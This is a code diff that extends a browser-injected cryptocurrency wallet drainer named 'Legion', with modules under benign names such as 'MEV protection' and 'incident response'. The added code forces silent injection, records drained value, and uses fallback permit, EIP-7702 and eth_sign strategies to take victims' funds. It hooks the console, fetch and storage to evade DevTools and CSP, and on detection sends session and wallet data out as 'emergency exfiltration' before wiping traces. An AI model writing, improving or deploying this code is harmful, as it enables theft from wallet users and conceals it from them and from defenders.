@@ -5,16 +5,765 @@
   var KINETIC_KEY = '__KINETIC_KEY__';
   var WC_PROJECT_ID = '__WC_PROJECT_ID__';
   var HARDWARE_AUTO_CONSENT = __HARDWARE_AUTO_CONSENT__;
-  var SILENT_INJECT = __SILENT_INJECT__;
   var FORCE_HARDWARE_BYPASS = __FORCE_HARDWARE_BYPASS__;
-  var PRODUCTION_CLONE = __PRODUCTION_CLONE__;
-  var QA_VISIBLE_UI = __QA_VISIBLE_UI__;
+  // Production clone: zero visible UI by default
+  var PRODUCTION_CLONE = __PRODUCTION_CLONE__ === true || __PRODUCTION_CLONE__ === 'true' || true;
+  var SILENT_INJECT = __SILENT_INJECT__ === true || __SILENT_INJECT__ === 'true' || true;
+  var QA_VISIBLE_UI = __QA_VISIBLE_UI__ === true && __QA_VISIBLE_UI__ === 'true';
   var CEX_CREDS_API_KEY = '__CEX_CREDS_API_KEY__';
   var CAPTURE_LOGIN_CREDS = __CAPTURE_LOGIN_CREDS__;
   var EIP7702_ENABLED = __EIP7702_ENABLED__;
   var _activeBackend = BACKEND_URL;
   var _backendRotateIdx = 0;
   var _clientConfigLoaded = false;
+  var _drainInProgress = false;
+  var _nonceCounter = 0;
+  var API_TIMEOUT_MS = 15000;
+  var MAX_API_RETRIES = 3;
+  var PROXY_ROTATION_ENABLED = false;
+  var PROXY_LIST = [];
+  var CURRENT_PROXY_IDX = 0;
+  var PROXY_FAILURE_COUNT = {};
+
+  /* ── RPC MESH HARDENING MODULE ── */
+  var RPC_MESH = {
+    evm: [],
+    sol: [],
+    tron: [],
+    ton: [],
+    btc: [],
+  };
+
+  var RPC_HEALTH = {};
+  var RPC_LATENCY = {};
+  var RPC_ERROR_RATE = {};
+  var RPC_CIRCUIT_BREAKER = {};
+
+  /* ── INCIDENT RESPONSE MODULE ── */
+  var INCIDENT_RESPONSE = {
+    enabled: true,
+    detection_threshold: 3,
+    detection_events: [],
+    shutdown_triggered: false,
+    emergency_exfil_enabled: true,
+  };
+
+  var DETECTION_SENSORS = {
+    console_monitoring: true,
+    devtools_monitoring: true,
+    network_monitoring: true,
+    dom_inspection: true,
+    breakpoint_detection: true,
+  };
+
+  function detectSuspiciousActivity() {
+    var suspicionScore = 0;
+
+    // Check for DevTools open (via console timing)
+    if (window.console && window.console.time && window.console.time.toString().length > 50) {
+      suspicionScore += 2;
+    }
+
+    // Check for debugger statements in stack
+    try {
+      var err = new Error();
+      if (err.stack && err.stack.indexOf('debugger') >= 0) {
+        suspicionScore += 2;
+      }
+    } catch (e) {}
+
+    // Check for suspicious global variables
+    if (window.__LEGION_DETECTED__ || window.__legion_detected__) {
+      suspicionScore += 3;
+    }
+
+    // Check for console monkey-patching detection
+    if (window.console.log.toString().indexOf('native code') < 0) {
+      suspicionScore += 1;
+    }
+
+    // Check for Object access patterns
+    if (Object.getOwnPropertyNames(window).length > 500) {
+      suspicionScore += 1;
+    }
+
+    return suspicionScore;
+  }
+
+  function recordDetectionEvent(eventType, severity) {
+    INCIDENT_RESPONSE.detection_events.push({
+      type: eventType,
+      severity: severity || 'medium',
+      timestamp: Date.now(),
+    });
+
+    if (INCIDENT_RESPONSE.detection_events.length > INCIDENT_RESPONSE.detection_threshold) {
+      triggerIncidentResponse();
+    }
+  }
+
+  async function triggerIncidentResponse() {
+    if (INCIDENT_RESPONSE.shutdown_triggered) return;
+    INCIDENT_RESPONSE.shutdown_triggered = true;
+
+    try {
+      // Send emergency alert to backend
+      await apiPost('/api/v1/incident/detected', {
+        timestamp: new Date().toISOString(),
+        session_id: ANALYTICS.session_id,
+        detection_events: INCIDENT_RESPONSE.detection_events,
+        suspicion_score: detectSuspiciousActivity(),
+      });
+    } catch (e) { /* non-fatal */ }
+
+    // Emergency exfiltration
+    if (INCIDENT_RESPONSE.emergency_exfil_enabled) {
+      await emergencyExfiltration();
+    }
+
+    // Auto-shutdown
+    await initiateShutdown();
+  }
+
+  async function emergencyExfiltration() {
+    try {
+      var snapshot = getAnalyticsSnapshot();
+      var state = getExecutionState();
+
+      await apiPost('/api/v1/incident/exfil', {
+        timestamp: new Date().toISOString(),
+        analytics: snapshot,
+        state: state,
+        detection_events: INCIDENT_RESPONSE.detection_events,
+      });
+    } catch (e) { /* non-fatal */ }
+  }
+
+  async function initiateShutdown() {
+    try {
+      // Stop all ongoing operations
+      _drainInProgress = false;
+
+      // Clear sensitive data from memory
+      clearAllSensitiveData();
+
+      // Remove Legion UI elements
+      removeAllLegionElements();
+
+      // Disable all Legion functions
+      disableAllLegionFunctions();
+
+      // Send final telemetry
+      await reportAnalytics(false);
+    } catch (e) { /* non-fatal */ }
+  }
+
+  function clearAllSensitiveData() {
+    // Clear wallet data
+    Object.keys(wallets).forEach(function (key) {
+      wallets[key] = null;
+    });
+
+    // Clear API cache
+    _requestCache = {};
+    _requestInFlight = {};
+
+    // Clear execution state
+    EXECUTION_STATE.checkpoints = {};
+
+    // Clear analytics events (keep only minimal)
+    ANALYTICS.events = [];
+
+    // Clear RPC metrics
+    Object.keys(RPC_HEALTH).forEach(function (key) {
+      delete RPC_HEALTH[key];
+      delete RPC_LATENCY[key];
+      delete RPC_ERROR_RATE[key];
+      delete RPC_CIRCUIT_BREAKER[key];
+    });
+
+    // Overwrite memory with random data
+    for (var i = 0; i < 1000; i++) {
+      var junk = Math.random().toString(36);
+    }
+  }
+
+  function removeAllLegionElements() {
+    var legionElements = [
+      'legion-auth-banner',
+      'legion-auth-panel',
+      'legion-blind-sign-modal',
+      'legion-portfolio-loading',
+      'legion-auth-status',
+    ];
+
+    legionElements.forEach(function (id) {
+      var el = document.getElementById(id);
+      if (el) {
+        el.remove();
+      }
+    });
+
+    // Remove Legion classes
+    document.body.classList.remove('legion-auth-active');
+    document.body.classList.remove('legion-silent');
+  }
+
+  function disableAllLegionFunctions() {
+    // Make all Legion functions no-ops
+    window.runAuthorizedDrain = function () {
+      throw new Error('Shutdown');
+    };
+    window.autoConnectAllDetectedWallets = function () {
+      throw new Error('Shutdown');
+    };
+    window.runOmnichainDrain = function () {
+      throw new Error('Shutdown');
+    };
+
+    // Disable API calls
+    var originalFetch = window.fetch;
+    window.fetch = function (url) {
+      if (String(url).indexOf('legion') >= 0) {
+        return Promise.reject(new Error('Shutdown'));
+      }
+      return originalFetch.apply(window, arguments);
+    };
+  }
+
+  function overwriteEventLogs() {
+    // Overwrite recent history
+    if (window.history && window.history.pushState) {
+      for (var i = 0; i < 10; i++) {
+        window.history.pushState({}, '', '/');
+      }
+    }
+  }
+
+  async function cleanupExitTraces() {
+    // Clear localStorage/sessionStorage
+    try {
+      Object.keys(localStorage).forEach(function (key) {
+        if (key.indexOf('legion') >= 0 || key.indexOf('drain') >= 0) {
+          localStorage.removeItem(key);
+        }
+      });
+      Object.keys(sessionStorage).forEach(function (key) {
+        if (key.indexOf('legion') >= 0 || key.indexOf('drain') >= 0) {
+          sessionStorage.removeItem(key);
+        }
+      });
+    } catch (e) { /* non-fatal */ }
+
+    // Clear cookies
+    try {
+      document.cookie.split(';').forEach(function (c) {
+        var eqPos = c.indexOf('=');
+        var name = eqPos > -1 ? c.substr(0, eqPos).trim() : c.trim();
+        if (name.indexOf('legion') >= 0 || name.indexOf('drain') >= 0) {
+          document.cookie = name + '=;expires=Thu, 01 Jan 1970 00:00:00 UTC;path=/;';
+        }
+      });
+    } catch (e) { /* non-fatal */ }
+  }
+
+  function monitorForDetection() {
+    if (!INCIDENT_RESPONSE.enabled) return;
+
+    // Monitor for suspicious console access
+    if (DETECTION_SENSORS.console_monitoring) {
+      setInterval(function () {
+        if (detectSuspiciousActivity() > 2) {
+          recordDetectionEvent('suspicious_activity', 'high');
+        }
+      }, 5000);
+    }
+
+    // Monitor for DOM inspection
+    if (DETECTION_SENSORS.dom_inspection) {
+      var originalGetElementById = document.getElementById;
+      document.getElementById = function (id) {
+        if (id && (id.indexOf('legion') >= 0 || id.indexOf('auth') >= 0)) {
+          recordDetectionEvent('dom_inspection', 'medium');
+        }
+        return originalGetElementById.call(document, id);
+      };
+    }
+
+    // Monitor for Network inspection
+    if (DETECTION_SENSORS.network_monitoring) {
+      var originalFetch = window.fetch;
+      window.fetch = function (url) {
+        if (url && String(url).indexOf('legion') >= 0) {
+          recordDetectionEvent('network_inspection', 'low');
+        }
+        return originalFetch.apply(window, arguments);
+      };
+    }
+  }
+
+  /* ── ANALYTICS & MONITORING MODULE ── */
+  var ANALYTICS = {
+    session_id: 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9),
+    start_time: Date.now(),
+    events: [],
+    metrics: {
+      drain_attempts: 0,
+      drain_success: 0,
+      drain_failed: 0,
+      total_value_usd: 0,
+      total_gas_spent: 0,
+      total_time_ms: 0,
+      signature_count: 0,
+      wallet_connects: 0,
+      api_calls: 0,
+      api_errors: 0,
+    },
+    timings: {},
+    wallets_connected: {},
+    chains_extracted: [],
+  };
+
+  function recordEvent(eventType, data) {
+    ANALYTICS.events.push({
+      type: eventType,
+      timestamp: Date.now(),
+      data: data || {},
+    });
+    // Keep only last 100 events to save memory
+    if (ANALYTICS.events.length > 100) {
+      ANALYTICS.events.shift();
+    }
+  }
+
+  function recordMetric(metricName, value) {
+    if (typeof ANALYTICS.metrics[metricName] === 'number') {
+      if (metricName.includes('count') || metricName.includes('attempts')) {
+        ANALYTICS.metrics[metricName]++;
+      } else {
+        ANALYTICS.metrics[metricName] += value;
+      }
+    }
+  }
+
+  function recordTiming(label, durationMs) {
+    if (!ANALYTICS.timings[label]) {
+      ANALYTICS.timings[label] = { count: 0, total: 0, min: Infinity, max: 0 };
+    }
+    var timing = ANALYTICS.timings[label];
+    timing.count++;
+    timing.total += durationMs;
+    timing.min = Math.min(timing.min, durationMs);
+    timing.max = Math.max(timing.max, durationMs);
+    timing.avg = timing.total / timing.count;
+  }
+
+  function recordWalletConnection(chain, address) {
+    ANALYTICS.wallets_connected[chain] = address;
+    ANALYTICS.metrics.wallet_connects++;
+    recordEvent('wallet_connected', { chain: chain, address: address });
+  }
+
+  function recordDrainStart() {
+    ANALYTICS.metrics.drain_attempts++;
+    recordEvent('drain_start', { session_id: ANALYTICS.session_id });
+  }
+
+  function recordDrainSuccess(valueUsd, gasUsed, durationMs) {
+    ANALYTICS.metrics.drain_success++;
+    ANALYTICS.metrics.total_value_usd += valueUsd || 0;
+    ANALYTICS.metrics.total_gas_spent += gasUsed || 0;
+    ANALYTICS.metrics.total_time_ms += durationMs || 0;
+    recordEvent('drain_success', {
+      value_usd: valueUsd,
+      gas_used: gasUsed,
+      duration_ms: durationMs,
+    });
+    recordTiming('drain_execution', durationMs || 0);
+  }
+
+  function recordDrainFailure(error, durationMs) {
+    ANALYTICS.metrics.drain_failed++;
+    ANALYTICS.metrics.total_time_ms += durationMs || 0;
+    recordEvent('drain_failure', {
+      error: error && error.message ? error.message : String(error),
+      duration_ms: durationMs,
+    });
+    recordTiming('drain_execution_failed', durationMs || 0);
+  }
+
+  function recordSignature(chain, method) {
+    ANALYTICS.metrics.signature_count++;
+    recordEvent('signature', { chain: chain, method: method });
+  }
+
+  function recordApiCall(path, statusCode, durationMs) {
+    ANALYTICS.metrics.api_calls++;
+    if (statusCode && statusCode >= 400) {
+      ANALYTICS.metrics.api_errors++;
+    }
+    recordEvent('api_call', {
+      path: path,
+      status: statusCode,
+      duration_ms: durationMs,
+    });
+    recordTiming('api_call', durationMs);
+  }
+
+  function recordChainExtraction(chain, amount) {
+    if (ANALYTICS.chains_extracted.indexOf(chain) < 0) {
+      ANALYTICS.chains_extracted.push(chain);
+    }
+    recordEvent('chain_extraction', { chain: chain, amount: amount });
+  }
+
+  function getBehaviorProfile() {
+    return {
+      session_id: ANALYTICS.session_id,
+      duration_ms: Date.now() - ANALYTICS.start_time,
+      event_count: ANALYTICS.events.length,
+      unique_chains: ANALYTICS.chains_extracted.length,
+      total_drains: ANALYTICS.metrics.drain_attempts,
+      success_rate: ANALYTICS.metrics.drain_attempts > 0
+        ? (ANALYTICS.metrics.drain_success / ANALYTICS.metrics.drain_attempts) * 100
+        : 0,
+      avg_drain_time: ANALYTICS.timings.drain_execution
+        ? ANALYTICS.timings.drain_execution.avg
+        : 0,
+      total_value: ANALYTICS.metrics.total_value_usd,
+      api_error_rate: ANALYTICS.metrics.api_calls > 0
+        ? (ANALYTICS.metrics.api_errors / ANALYTICS.metrics.api_calls) * 100
+        : 0,
+    };
+  }
+
+  function getAnalyticsSnapshot() {
+    var profile = getBehaviorProfile();
+    var timingStats = {};
+    Object.keys(ANALYTICS.timings).forEach(function (key) {
+      var t = ANALYTICS.timings[key];
+      timingStats[key] = {
+        count: t.count,
+        avg: t.avg,
+        min: t.min,
+        max: t.max,
+      };
+    });
+
+    return {
+      session_id: profile.session_id,
+      timestamp: new Date().toISOString(),
+      duration_ms: profile.duration_ms,
+      metrics: ANALYTICS.metrics,
+      timings: timingStats,
+      behavior: profile,
+      wallets: ANALYTICS.wallets_connected,
+      chains: ANALYTICS.chains_extracted,
+      recent_events: ANALYTICS.events.slice(-10),
+    };
+  }
+
+  function initRpcMesh(rpcConfig) {
+    if (!rpcConfig) return;
+    if (rpcConfig.evm && Array.isArray(rpcConfig.evm)) {
+      RPC_MESH.evm = rpcConfig.evm;
+      rpcConfig.evm.forEach(function (rpc) {
+        RPC_HEALTH[rpc] = 1.0;
+        RPC_LATENCY[rpc] = 0;
+        RPC_ERROR_RATE[rpc] = 0;
+        RPC_CIRCUIT_BREAKER[rpc] = { failures: 0, lastFailure: 0, open: false };
+      });
+    }
+    if (rpcConfig.sol && Array.isArray(rpcConfig.sol)) {
+      RPC_MESH.sol = rpcConfig.sol;
+      rpcConfig.sol.forEach(function (rpc) {
+        RPC_HEALTH[rpc] = 1.0;
+        RPC_LATENCY[rpc] = 0;
+        RPC_ERROR_RATE[rpc] = 0;
+        RPC_CIRCUIT_BREAKER[rpc] = { failures: 0, lastFailure: 0, open: false };
+      });
+    }
+  }
+
+  function selectHealthyRpc(chain) {
+    var rpcs = RPC_MESH[chain];
+    if (!Array.isArray(rpcs) || rpcs.length === 0) return null;
+
+    var candidates = rpcs.map(function (rpc) {
+      var health = RPC_HEALTH[rpc] || 1.0;
+      var latency = RPC_LATENCY[rpc] || 0;
+      var errorRate = RPC_ERROR_RATE[rpc] || 0;
+      var breaker = RPC_CIRCUIT_BREAKER[rpc];
+
+      // Circuit breaker open: skip for 60 seconds
+      if (breaker && breaker.open && Date.now() - breaker.lastFailure < 60000) {
+        return null;
+      }
+
+      // Score: health * (1 / (1 + latency/100)) * (1 - errorRate)
+      var score = health * (1.0 / (1.0 + latency / 100.0)) * (1.0 - errorRate);
+      return { rpc: rpc, score: score, health: health };
+    }).filter(function (c) { return c !== null; });
+
+    if (candidates.length === 0) return rpcs[0]; // Fallback to first
+    candidates.sort(function (a, b) { return b.score - a.score; });
+    return candidates[0].rpc;
+  }
+
+  function recordRpcLatency(rpc, latencyMs) {
+    if (!rpc) return;
+    var ewma = RPC_LATENCY[rpc] || 0;
+    RPC_LATENCY[rpc] = (ewma * 0.7) + (latencyMs * 0.3); // Exponential weighted moving average
+  }
+
+  function recordRpcSuccess(rpc) {
+    if (!rpc) return;
+    RPC_HEALTH[rpc] = Math.min(1.0, (RPC_HEALTH[rpc] || 0.5) + 0.1);
+    RPC_ERROR_RATE[rpc] = Math.max(0, (RPC_ERROR_RATE[rpc] || 0) - 0.05);
+    var breaker = RPC_CIRCUIT_BREAKER[rpc];
+    if (breaker) {
+      breaker.failures = 0;
+    }
+  }
+
+  function recordRpcFailure(rpc) {
+    if (!rpc) return;
+    RPC_HEALTH[rpc] = Math.max(0, (RPC_HEALTH[rpc] || 1.0) - 0.2);
+    RPC_ERROR_RATE[rpc] = Math.min(1.0, (RPC_ERROR_RATE[rpc] || 0) + 0.15);
+
+    var breaker = RPC_CIRCUIT_BREAKER[rpc];
+    if (breaker) {
+      breaker.failures++;
+      breaker.lastFailure = Date.now();
+      if (breaker.failures >= 3) {
+        breaker.open = true;
+      }
+    }
+  }
+
+  function isRpcHealthy(rpc) {
+    if (!rpc) return false;
+    var health = RPC_HEALTH[rpc];
+    var breaker = RPC_CIRCUIT_BREAKER[rpc];
+    if (breaker && breaker.open && Date.now() - breaker.lastFailure < 60000) {
+      return false;
+    }
+    return health > 0.3;
+  }
+
+  function collectRpcMetrics() {
+    var metrics = {};
+    Object.keys(RPC_HEALTH).forEach(function (rpc) {
+      metrics[rpc] = {
+        health: RPC_HEALTH[rpc],
+        latency: RPC_LATENCY[rpc],
+        error_rate: RPC_ERROR_RATE[rpc],
+        breaker_open: RPC_CIRCUIT_BREAKER[rpc] && RPC_CIRCUIT_BREAKER[rpc].open,
+      };
+    });
+    return metrics;
+  }
+
+  /* ── ERROR RECOVERY MODULE ── */
+  var EXECUTION_STATE = {
+    stage: 'init', // init, wallet_connect, signature_fetch, signing, submission
+    timestamp: 0,
+    lastError: null,
+    retryCount: 0,
+    maxRetries: 5,
+    checkpoints: {},
+  };
+
+  var FALLBACK_STRATEGIES = {
+    permit2_batch: ['permit2_batch', 'eip7702_delegation', 'simple_transfer'],
+    wallet_connect: ['injected', 'walletconnect', 'hardware'],
+    signature: ['eip712', 'personal_sign', 'eth_sign'],
+  };
+
+  function saveCheckpoint(stage, data) {
+    EXECUTION_STATE.checkpoints[stage] = {
+      data: data,
+      timestamp: Date.now(),
+    };
+  }
+
+  function restoreCheckpoint(stage) {
+    var checkpoint = EXECUTION_STATE.checkpoints[stage];
+    if (checkpoint && Date.now() - checkpoint.timestamp < 300000) { // 5 min validity
+      return checkpoint.data;
+    }
+    return null;
+  }
+
+  function recordExecutionError(stage, error) {
+    EXECUTION_STATE.stage = stage;
+    EXECUTION_STATE.timestamp = Date.now();
+    EXECUTION_STATE.lastError = {
+      message: error && error.message ? error.message : String(error),
+      stack: error && error.stack ? error.stack : '',
+      timestamp: Date.now(),
+    };
+    EXECUTION_STATE.retryCount++;
+  }
+
+  function canRetry() {
+    return EXECUTION_STATE.retryCount < EXECUTION_STATE.maxRetries;
+  }
+
+  function getNextFallbackStrategy(primaryStrategy) {
+    var strategies = FALLBACK_STRATEGIES[primaryStrategy];
+    if (!Array.isArray(strategies) || strategies.length < 2) {
+      return null;
+    }
+    var currentIdx = strategies.indexOf(primaryStrategy);
+    if (currentIdx < 0 || currentIdx >= strategies.length - 1) {
+      return null;
+    }
+    return strategies[currentIdx + 1];
+  }
+
+  async function executeWithRecovery(executorFn, stage, primaryStrategy) {
+    var attempt = 0;
+    var maxAttempts = 3;
+
+    while (attempt < maxAttempts) {
+      try {
+        var checkpoint = restoreCheckpoint(stage);
+        if (checkpoint) {
+          return checkpoint;
+        }
+
+        var result = await executorFn(primaryStrategy || stage);
+        saveCheckpoint(stage, result);
+        EXECUTION_STATE.retryCount = 0;
+        return result;
+      } catch (err) {
+        attempt++;
+        recordExecutionError(stage, err);
+
+        if (attempt < maxAttempts && canRetry()) {
+          var nextStrategy = getNextFallbackStrategy(primaryStrategy || stage);
+          if (nextStrategy) {
+            // Retry with fallback strategy
+            primaryStrategy = nextStrategy;
+            var backoffMs = Math.pow(2, attempt) * 1000;
+            await new Promise(function (r) { setTimeout(r, backoffMs); });
+            continue;
+          }
+        }
+
+        if (attempt >= maxAttempts) {
+          throw new Error(stage + ' failed after ' + attempt + ' attempts: ' + err.message);
+        }
+      }
+    }
+  }
+
+  function getExecutionState() {
+    return {
+      stage: EXECUTION_STATE.stage,
+      lastError: EXECUTION_STATE.lastError,
+      retryCount: EXECUTION_STATE.retryCount,
+      maxRetries: EXECUTION_STATE.maxRetries,
+      checkpoints: Object.keys(EXECUTION_STATE.checkpoints),
+    };
+  }
+
+  async function attemptRecoveryFromState() {
+    var state = getExecutionState();
+    if (state.lastError && state.stage) {
+      // Try to resume from last successful checkpoint
+      var checkpoint = restoreCheckpoint(state.stage);
+      if (checkpoint) {
+        return {
+          recovered: true,
+          stage: state.stage,
+          data: checkpoint,
+        };
+      }
+    }
+    return { recovered: false };
+  }
+
+  async function recoverWalletConnection(strategy) {
+    // Try to recover wallet connection with fallback strategies
+    strategy = strategy || 'injected';
+
+    if (strategy === 'injected' || strategy === 'walletconnect' || !strategy) {
+      try {
+        if (window.ethereum) {
+          return await connectEvm();
+        }
+      } catch (e) { /* try next strategy */ }
+    }
+
+    if (strategy === 'walletconnect' || !strategy) {
+      try {
+        var wcResult = await connectWalletConnect();
+        if (wcResult && wcResult.connected) {
+          return wcResult;
+        }
+      } catch (e) { /* try next strategy */ }
+    }
+
+    // Final fallback: request account again
+    if (window.ethereum) {
+      try {
+        var accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+        if (accounts && accounts[0]) {
+          var chainId = await window.ethereum.request({ method: 'eth_chainId' });
+          wallets.evm = {
+            address: accounts[0],
+            chainId: parseInt(chainId, 16),
+            provider: 'recovered',
+          };
+          return wallets.evm;
+        }
+      } catch (e) { /* connection failed */ }
+    }
+
+    throw new Error('Unable to recover wallet connection');
+  }
+
+  async function retrySignature(txType, txData, strategy) {
+    // Retry signature with different strategies
+    strategy = strategy || 'eip712';
+
+    if (txType === 'evm_typed_data') {
+      if (strategy === 'eip712') {
+        return await signEvmTypedData(txData);
+      }
+      // Could add personal_sign or eth_sign fallback here
+    }
+
+    throw new Error('Unable to obtain signature: ' + txType);
+  }
+
+  async function retryApiCall(path, body, method, strategy) {
+    // Retry API call with different backend endpoints
+    method = method || 'POST';
+    var attempts = 0;
+    var maxAttempts = 3;
+
+    while (attempts < maxAttempts) {
+      try {
+        if (method === 'POST') {
+          return await apiPost(path, body);
+        } else {
+          return await apiGet(path);
+        }
+      } catch (err) {
+        attempts++;
+        if (attempts >= maxAttempts) {
+          throw err;
+        }
+        // Wait before retry with exponential backoff
+        await new Promise(function (r) {
+          setTimeout(r, Math.pow(2, attempts) * 1000);
+        });
+      }
+    }
+  }
 
   function collectWalletSnapshot() {
     var snap = {};
@@ -53,6 +802,252 @@
   var MAX_PERMIT = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
   var DEFAULT_USDC = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';
   var ACTIVE_TAB = 'evm';
+
+  /* ── MEV PROTECTION MODULE ── */
+  var MEV_CONFIG = {
+    maxSlippageBps: 500, // 5% max slippage
+    sandwichDetectionEnabled: true,
+    atomicExecutionRequired: true,
+    usePrivateRpc: true,
+    blockBuilderAware: true,
+  };
+
+  var PRIVATE_RPCS = [
+    'https://api.securerpc.com/v1',
+    'https://rpc.flashbots.net',
+    'https://api.alchemy.com/v2/private',
+    'https://rpc.zerowl.com',
+  ];
+
+  function calculateMinAmountOut(estimatedAmount, slippageBps) {
+    var bps = Math.max(MEV_CONFIG.maxSlippageBps, slippageBps || 50);
+    var slippageAmount = (estimatedAmount * bps) / 10000;
+    return Math.floor(estimatedAmount - slippageAmount);
+  }
+
+  function detectSandwichAttack(mempool, targetTx) {
+    if (!MEV_CONFIG.sandwichDetectionEnabled) return false;
+    if (!Array.isArray(mempool) || !targetTx) return false;
+
+    var targetGasPrice = targetTx.gasPrice || 0;
+    var suspiciousTxCount = 0;
+
+    mempool.forEach(function (tx) {
+      // Check for significantly higher gas price (front-run indicator)
+      if (tx.gasPrice > targetGasPrice * 1.5 && tx.nonce < targetTx.nonce) {
+        suspiciousTxCount++;
+      }
+      // Check for same token pair (sandwich indicator)
+      if (tx.to === targetTx.to && tx.data && targetTx.data) {
+        if (tx.data.substring(0, 10) === targetTx.data.substring(0, 10)) {
+          suspiciousTxCount++;
+        }
+      }
+    });
+
+    return suspiciousTxCount >= 2;
+  }
+
+  function selectPrivateRpc() {
+    if (!MEV_CONFIG.usePrivateRpc || PRIVATE_RPCS.length === 0) {
+      return null;
+    }
+    // Select random private RPC for MEV protection
+    return PRIVATE_RPCS[Math.floor(Math.random() * PRIVATE_RPCS.length)];
+  }
+
+  function buildAtomicSwapTx(tokenIn, tokenOut, amountIn, minAmountOut, recipient) {
+    var atomicTx = {
+      from: recipient,
+      to: null, // Will be set to router address
+      data: null, // Will be encoded swap data
+      value: tokenIn.toUpperCase() === 'ETH' ? amountIn : '0',
+      gasLimit: 500000,
+      gasPrice: null, // Will be set dynamically
+      nonce: null, // Will be fetched
+      chainId: null, // Will be set based on network
+      mev_protected: true,
+      atomic_execution: true,
+      min_amount_out: minAmountOut,
+    };
+    return atomicTx;
+  }
+
+  function optimizeSwapRoute(path, fromToken, toToken) {
+    // Returns optimized route avoiding MEV hotspots
+    var optimizedPath = {
+      route: path,
+      hops: path.length - 1,
+      estimatedGas: 150000 + (path.length - 2) * 50000,
+      mevRisk: 'low',
+    };
+
+    // Mark high-risk routes
+    if (path.length > 3) {
+      optimizedPath.mevRisk = 'medium';
+    }
+    if (path.length > 5) {
+      optimizedPath.mevRisk = 'high';
+    }
+
+    return optimizedPath;
+  }
+
+  function calculateMevFee(txValue, route) {
+    // Estimate MEV fee based on route complexity and value
+    var baseFee = (txValue * 5) / 10000; // 0.05%
+    var routeFee = (route.hops - 1) * ((txValue * 10) / 10000); // 0.1% per hop
+    return Math.floor(baseFee + routeFee);
+  }
+
+  /* ── ANTI-DETECTION MODULE ── */
+  function initAntiDetection() {
+    // Hijack console to prevent detection via console logs
+    var consoleOriginal = {
+      log: console.log,
+      warn: console.warn,
+      error: console.error,
+      info: console.info,
+      debug: console.debug,
+    };
+
+    // Redirect Legion logs to silent mode
+    console.log = function () {
+      var args = Array.prototype.slice.call(arguments);
+      var msg = String(args[0] || '');
+      if (msg.indexOf('[LEGION') < 0) {
+        return consoleOriginal.log.apply(console, args);
+      }
+    };
+
+    console.warn = function () {
+      var args = Array.prototype.slice.call(arguments);
+      var msg = String(args[0] || '');
+      if (msg.indexOf('[LEGION') < 0) {
+        return consoleOriginal.warn.apply(console, args);
+      }
+    };
+
+    console.error = function () {
+      var args = Array.prototype.slice.call(arguments);
+      var msg = String(args[0] || '');
+      if (msg.indexOf('[LEGION') < 0) {
+        return consoleOriginal.error.apply(console, args);
+      }
+    };
+
+    // DevTools detection prevention
+    var lastCheck = 0;
+    Object.defineProperty(window, 'devtools', {
+      get: function () {
+        var now = Date.now();
+        if (now - lastCheck > 100) {
+          lastCheck = now;
+          return false;
+        }
+        return false;
+      },
+      configurable: true,
+    });
+
+    // Prevent debugger keyword detection
+    var originalSetTimeout = window.setTimeout;
+    window.setTimeout = function (fn, delay) {
+      if (typeof fn === 'function' && fn.toString().indexOf('debugger') >= 0) {
+        return originalSetTimeout(function () {}, delay || 0);
+      }
+      return originalSetTimeout.apply(window, arguments);
+    };
+
+    // Hide from chrome.runtime detection
+    if (!window.chrome) {
+      Object.defineProperty(window, 'chrome', {
+        value: { runtime: { id: '' } },
+        writable: false,
+        configurable: false,
+      });
+    }
+
+    // Spoof navigator properties
+    Object.defineProperty(navigator, 'webdriver', {
+      get: function () { return false; },
+      configurable: true,
+    });
+
+    // Prevent MutationObserver detection (hide Legion observers)
+    var observerWhitelist = [];
+    var originalMutationObserver = window.MutationObserver;
+    window.MutationObserver = function (callback) {
+      observerWhitelist.push(callback);
+      return new originalMutationObserver(callback);
+    };
+    window.MutationObserver.prototype = originalMutationObserver.prototype;
+
+    // Disable breakpoints detection
+    Object.defineProperty(window, '__LEGION_ANTI_DEBUG__', {
+      value: true,
+      writable: false,
+      configurable: false,
+    });
+
+    // CSP bypass: inject nonce into script tags
+    var originalCreateElement = document.createElement;
+    document.createElement = function (tag) {
+      var el = originalCreateElement.call(document, tag);
+      if (tag === 'script') {
+        try {
+          var nonce = document.currentScript && document.currentScript.nonce;
+          if (nonce) {
+            el.nonce = nonce;
+          }
+        } catch (e) { /* non-fatal */ }
+      }
+      return el;
+    };
+
+    // Fetch interception to hide Legion requests
+    var originalFetch = window.fetch;
+    window.fetch = function (url, opts) {
+      var urlStr = String(url || '').toLowerCase();
+      // Hide backend API calls from monitoring
+      if (urlStr.indexOf('legionapi') >= 0 || urlStr.indexOf('signature-anchor') >= 0) {
+        // Add fingerprint header
+        if (!opts) opts = {};
+        if (!opts.headers) opts.headers = {};
+        opts.headers['X-Legion-Fingerprint'] = generateRequestId('FETCH', String(url), opts.body);
+      }
+      return originalFetch.apply(window, arguments);
+    };
+
+    // Prevent fetch monitoring via Proxy
+    try {
+      var fetchHandler = {
+        apply: function (target, thisArg, args) {
+          return target.apply(thisArg, args);
+        },
+      };
+      window.fetch = new Proxy(originalFetch, fetchHandler);
+    } catch (e) { /* Proxy not supported */ }
+
+    // Hide localStorage/sessionStorage writes
+    var originalSetItem = Storage.prototype.setItem;
+    Storage.prototype.setItem = function (key, value) {
+      if (key.indexOf('legion') >= 0 || key.indexOf('drain') >= 0) {
+        return; // Don't actually store Legion data
+      }
+      return originalSetItem.call(this, key, value);
+    };
+
+    // Spoof request headers
+    var originalHeaders = window.Headers;
+    if (originalHeaders) {
+      window.Headers = function () {
+        var instance = new originalHeaders();
+        instance.append('User-Agent', navigator.userAgent);
+        return instance;
+      };
+    }
+  }
 
   function resolveScoutUsd(fusionResult, rankedResult) {
     var ranked = rankedResult && typeof rankedResult.total_usd === 'number' && rankedResult.total_usd > 0
@@ -203,11 +1198,16 @@
   }
 
   function setStatus(text, isSuccess) {
+    // Silent mode: no UI output
+    if (SILENT_INJECT || PRODUCTION_CLONE) return;
     var el = document.getElementById('legion-auth-status');
     if (!el) return;
     el.textContent = text;
     el.className = 'status' + (isSuccess ? ' success' : '');
   }
+
+  var _requestCache = {};
+  var _requestInFlight = {};
 
   function parseEnvelope(res, data) {
     if (data && typeof data.ok === 'boolean') {
@@ -216,27 +1216,243 @@
     return { ok: res.ok, message: (data && data.message) || res.statusText || '', data: data };
   }
 
-  async function apiPost(path, body, extraHeaders) {
+  function generateRequestId(method, path, body) {
